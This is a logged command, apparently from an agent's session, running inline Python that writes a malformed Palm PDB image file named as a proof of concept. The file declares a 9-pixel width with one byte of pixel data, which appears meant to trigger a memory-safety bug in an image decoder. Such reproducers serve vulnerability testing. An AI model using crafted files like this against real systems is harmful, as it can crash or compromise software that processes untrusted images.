Running command: python3 -c "
import struct

# PDBInfo
name = b'A' * 32
attributes = struct.pack('>H', 0)
version = struct.pack('>H', 0)
create_time = struct.pack('>I', 0)
modify_time = struct.pack('>I', 0)
archive_time = struct.pack('>I', 0)
modify_number = struct.pack('>I', 0)
application_info = struct.pack('>I', 0)
sort_info = struct.pack('>I', 0)
type_ = b'vIMG'
id_ = b'View'
seed = struct.pack('>I', 0)
next_record = struct.pack('>I', 0)
number_records = struct.pack('>H', 1)

pdb_info = name + attributes + version + create_time + modify_time + archive_time + modify_number + application_info + sort_info + type_ + id_ + seed + next_record + number_records

# Record header
offset = struct.pack('>I', 0)
tag = b'\x40\x6f\x80'
record_type = b'\x00'
record_header = offset + tag + record_type

# Image header
img_name = b'B' * 32
img_version = b'\x00'  # uncompressed
img_type = b'\xff'  # 1-bit monochrome
reserved_1 = struct.pack('>I', 0)
note = struct.pack('>I', 0)
x_last = struct.pack('>H', 0)
y_last = struct.pack('>H', 0)
reserved_2 = struct.pack('>I', 0)
x_anchor = struct.pack('>H', 0)
y_anchor = struct.pack('>H', 0)
width = struct.pack('>H', 9)  # not multiple of 8
height = struct.pack('>H', 1)

img_header = img_name + img_version + img_type + reserved_1 + note + x_last + y_last + reserved_2 + x_anchor + y_anchor + width + height

# Pixel data - only 1 byte for packets=1
pixel_data = b'\x00'

poc = pdb_info + record_header + img_header + pixel_data
with open('/workspace/poc.pdb', 'wb') as f:
    f.write(poc)
print(f'Created PoC: {len(poc)} bytes')
"
